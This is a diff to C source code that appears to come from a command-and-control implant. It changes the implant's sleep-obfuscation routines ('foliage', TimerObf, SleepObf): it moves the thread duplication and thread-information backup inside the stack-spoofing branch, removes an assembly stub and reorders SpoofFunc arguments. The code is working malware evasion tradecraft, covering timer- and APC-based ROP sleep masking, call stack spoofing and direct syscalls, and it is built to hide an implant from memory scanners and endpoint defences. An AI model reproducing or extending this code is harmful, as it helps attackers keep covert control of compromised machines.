@@ -23,8 +23,6 @@ typedef struct _SLEEP_PARAM
     PVOID   Slave;
 } SLEEP_PARAM, *PSLEEP_PARAM ;
 
-__asm__( "___chkstk_ms: ret\n" );
-
 /*!
  * @brief
  *  foliage is a sleep obfuscation technique that is using APC calls
@@ -422,21 +420,23 @@ BOOL TimerObf(
                         goto LEAVE;
                     }
 
-                    /* retrieve Tib if stack spoofing is enabled */
-                    if ( Instance.Config.Implant.StackSpoof ) {
+                    /* if stack spoofing is enabled then prepare some stuff */
+                    if ( Instance.Config.Implant.StackSpoof )
+                    {
+                        /* retrieve Tib if stack spoofing is enabled */
                         if ( ! ThreadQueryTib( C_PTR( TimerCtx.Rsp ), &NtTib ) ) {
                             PUTS( "Failed to retrieve Tib" )
                             goto LEAVE;
                         }
-                    }
 
-                    /* duplicate the current thread we are going to spoof the stack */
-                    if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &ThdSrc, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
-                        goto LEAVE;
-                    }
+                        /* duplicate the current thread we are going to spoof the stack */
+                        if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &ThdSrc, 0, 0, DUPLICATE_SAME_ACCESS ) ) ) {
+                            goto LEAVE;
+                        }
 
-                    /* NtTib backup */
-                    MemCopy( &BkpTib, &Instance.Teb->NtTib, sizeof( NT_TIB ) );
+                        /* NtTib backup */
+                        MemCopy( &BkpTib, &Instance.Teb->NtTib, sizeof( NT_TIB ) );
+                    }
 
                     /* at this point we can start preparing the ROPs and execute the timers */
                     for ( int i = 0; i < 13; i++ ) {
@@ -704,9 +704,9 @@ VOID SleepObf(
         /* default */
         case SLEEPOBF_NO_OBF: {}; default: {
             SpoofFunc(
-                Instance.Win32.WaitForSingleObjectEx,
                 Instance.Modules.KernelBase,
                 IMAGE_SIZE( Instance.Modules.KernelBase ),
+                Instance.Win32.WaitForSingleObjectEx,
                 NtCurrentProcess(),
                 C_PTR( TimeOut ),
                 FALSE
